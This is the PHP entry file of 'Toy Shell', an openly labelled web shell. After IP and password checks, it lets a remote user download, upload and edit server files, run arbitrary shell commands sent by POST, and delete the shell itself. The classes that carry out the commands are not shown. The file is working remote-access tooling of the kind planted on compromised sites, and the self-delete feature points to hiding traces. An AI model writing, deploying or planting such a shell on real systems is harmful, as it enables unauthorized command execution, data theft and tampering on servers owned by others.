<?php
/**
 * Toy Shell
 *
 * A simple web shell made in PHP.
 *
 * @since 1.0.6
 * @link  https://saku.fun/
 */
ini_set('log_errors', '0');
ini_set('display_errors', '1');
error_reporting(E_ALL);
session_start();

require_once 'class/AccessRestrictions.class.inc.php';

require_once 'class/Commands.class.ext.php';
require_once 'class/Shell.class.inc.php';
include_once 'config/config.inc.php';

// Access Restrictions
ishibashiTokyo\AccessRestrictions::Setting($conf);
ishibashiTokyo\AccessRestrictions::IpRestriction();
ishibashiTokyo\AccessRestrictions::SimpleAuth();

// Initialize
$Shell = new ishibashiTokyo\Shell;
$Shell->SessionInit();

// file download
if (isset($_GET['download'])) {
    $Shell->Download($_GET['download']);
}

// file upload
if (isset($_GET['upload'])) {
    $Shell->Upload();
}

// file edit & update
if (isset($_GET['edit'])) {
    $Shell->Edit($_GET['edit']);
}
if (isset($_GET['update'])) {
    $_update_option['path'] = $_POST['path'];
    $_update_option['data'] = $_POST['data'];
    $_update_option['touch'] = false;
    if ( isset($_POST['touch']) && $_POST['touch'] === "1") {
        $_update_option['touch'] = true;
    }
    $Shell->Update($_update_option);
}

if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);

    // Screen reset.
    if ($cmd === 'clear') {
        $Shell->clear();
        exit();
    }

    // Self delete
    if ($cmd === 'delete') {
        $Shell->delete();
        exit();
    }

    // Update current directory.
    if (preg_match("/^cd\s/i", $cmd) || preg_match("/^cd$/i", $cmd)) {
        $Shell->cd($cmd);
        exit();
    }

    // Update current directory.
    if (preg_match("/^ll\s/i", $cmd) || preg_match("/^ll$/i", $cmd)) {
        $Shell->ll($cmd);
        exit();
    }

    // Command execution and execution result recording.
    $Shell->exec($cmd);
}

// View
require 'template/window.tpl.php';